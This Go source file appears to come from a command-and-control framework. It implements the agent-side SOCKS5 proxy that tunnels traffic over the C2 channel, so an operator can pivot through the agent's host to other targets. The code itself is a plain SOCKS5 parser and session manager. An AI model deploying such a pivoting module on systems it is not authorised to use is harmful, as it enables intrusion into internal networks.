// Package proxy 提供 SOCKS5 代理支持。
// Agent 作为 SOCKS5 服务器端，通过 C2 通道转发数据。
// 架构：C2 Client → 本地 SOCKS 客户端 → C2 Server → Agent → 目标
package proxy

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
)

// SOCKS5 常量
const (
	SOCKS5Version    = 0x05
	SOCKS5NoAuth     = 0x00
	SOCKS5Connect    = 0x01
	SOCKS5Bind       = 0x02
	SOCKS5UDPAssocs  = 0x03
	SOCKS5IPv4       = 0x01
	SOCKS5Domain     = 0x03
	SOCKS5IPv6       = 0x04
	SOCKS5Succeeded  = 0x00
	SOCKS5Failure    = 0x01
	SOCKS5NotAllowed = 0x02
	SOCKS5NetUnreach = 0x03
	SOCKS5HostUnreach = 0x04
)

// SOCKS5Server 是 Agent 端的 SOCKS5 代理服务器。
type SOCKS5Server struct {
	mu       sync.Mutex
	sessions map[string]*SOCKS5Session
	nextID   uint32
}

// SOCKS5Session 表示一个活跃的 SOCKS 会话。
type SOCKS5Session struct {
	ID       string
	Target   string
	Port     int
	Conn     net.Conn
	Closed   bool
	mu       sync.Mutex
}

// IsClosed returns whether the session is closed.
func (s *SOCKS5Session) IsClosed() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Closed
}

// NewSOCKS5Server 创建 SOCKS5 代理服务器。
func NewSOCKS5Server() *SOCKS5Server {
	return &SOCKS5Server{
		sessions: make(map[string]*SOCKS5Session),
	}
}

// NewSession 创建新的 SOCKS5 会话（由 Server 端请求触发）。
func (s *SOCKS5Server) NewSession(id, target string, port int) (*SOCKS5Session, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	conn, err := net.Dial("tcp", net.JoinHostPort(target, fmt.Sprintf("%d", port)))
	if err != nil {
		return nil, fmt.Errorf("connect %s:%d: %w", target, port, err)
	}

	sess := &SOCKS5Session{
		ID:     id,
		Target: target,
		Port:   port,
		Conn:   conn,
	}
	s.sessions[id] = sess
	return sess, nil
}

// CloseSession 关闭 SOCKS5 会话。
func (s *SOCKS5Server) CloseSession(id string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if sess, ok := s.sessions[id]; ok {
		sess.mu.Lock()
		if !sess.Closed {
			sess.Closed = true
			if sess.Conn != nil {
				sess.Conn.Close()
			}
		}
		sess.mu.Unlock()
		delete(s.sessions, id)
	}
}

// SendData 向 SOCKS5 会话发送数据。
func (s *SOCKS5Server) SendData(id string, data []byte) (int, error) {
	s.mu.Lock()
	sess, ok := s.sessions[id]
	s.mu.Unlock()

	if !ok {
		return 0, fmt.Errorf("session %s not found", id)
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()

	if sess.Closed || sess.Conn == nil {
		return 0, fmt.Errorf("session %s closed", id)
	}

	return sess.Conn.Write(data)
}

// ReadData 从 SOCKS5 会话读取数据（阻塞直到有数据或连接关闭）。
func (s *SOCKS5Server) ReadData(id string, buf []byte) (int, error) {
	s.mu.Lock()
	sess, ok := s.sessions[id]
	s.mu.Unlock()

	if !ok {
		return 0, fmt.Errorf("session %s not found", id)
	}

	// A-P1-12: Read directly from conn without TOCTOU check on Closed flag.
	// If CloseSession is called concurrently, Conn.Close() will unblock this
	// read and return an error — safe and race-free.
	return sess.Conn.Read(buf)
}

// ListSessions 列出所有活跃会话。
func (s *SOCKS5Server) ListSessions() []*SOCKS5Session {
	s.mu.Lock()
	defer s.mu.Unlock()

	var result []*SOCKS5Session
	for _, sess := range s.sessions {
		result = append(result, sess)
	}
	return result
}

// NextID 生成下一个会话 ID。
func (s *SOCKS5Server) NextID() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.nextID++
	return fmt.Sprintf("socks-%d", s.nextID)
}

// ParseSocksConnect 解析 SOCKS5 CONNECT 请求的原始字节。
func ParseSocksConnect(data []byte) (target string, port int, err error) {
	if len(data) < 7 {
		return "", 0, fmt.Errorf("data too short for SOCKS5 request")
	}
	if data[0] != SOCKS5Version {
		return "", 0, fmt.Errorf("unsupported SOCKS version: %d", data[0])
	}
	cmd := data[1]
	if cmd != SOCKS5Connect {
		return "", 0, fmt.Errorf("unsupported SOCKS command: %d", cmd)
	}

	addrType := data[3]
	offset := 4
	switch addrType {
	case SOCKS5IPv4:
		if len(data) < offset+4+2 {
			return "", 0, fmt.Errorf("data too short for IPv4")
		}
		target = fmt.Sprintf("%d.%d.%d.%d", data[offset], data[offset+1], data[offset+2], data[offset+3])
		offset += 4
	case SOCKS5IPv6:
		if len(data) < offset+16+2 {
			return "", 0, fmt.Errorf("data too short for IPv6")
		}
		target = net.IP(data[offset : offset+16]).String()
		offset += 16
	case SOCKS5Domain:
		if len(data) < offset+1 {
			return "", 0, fmt.Errorf("data too short for domain length")
		}
		domainLen := int(data[offset])
		offset++
		if len(data) < offset+domainLen+2 {
			return "", 0, fmt.Errorf("data too short for domain")
		}
		target = string(data[offset : offset+domainLen])
		offset += domainLen
	default:
		return "", 0, fmt.Errorf("unsupported address type: %d", addrType)
	}

	port = int(binary.BigEndian.Uint16(data[offset:]))
	return target, port, nil
}

// BuildSocksGreeting 构建 SOCKS5 问候响应（发送给 C2 Client）。
func BuildSocksGreeting() []byte {
	return []byte{SOCKS5Version, SOCKS5NoAuth}
}

// BuildSocksConnectReply 构建 SOCKS5 CONNECT 成功响应。
func BuildSocksConnectReply() []byte {
	// version=5, reply=0(succeeded), rsv=0, atyp=1(IPv4), BND.ADDR=0.0.0.0, BND.PORT=0
	return []byte{
		SOCKS5Version, SOCKS5Succeeded, 0x00, SOCKS5IPv4,
		0, 0, 0, 0,
		0, 0,
	}
}

// BuildSocksErrorReply 构建 SOCKS5 错误响应。
func BuildSocksErrorReply(replyCode byte) []byte {
	return []byte{
		SOCKS5Version, replyCode, 0x00, SOCKS5IPv4,
		0, 0, 0, 0,
		0, 0,
	}
}
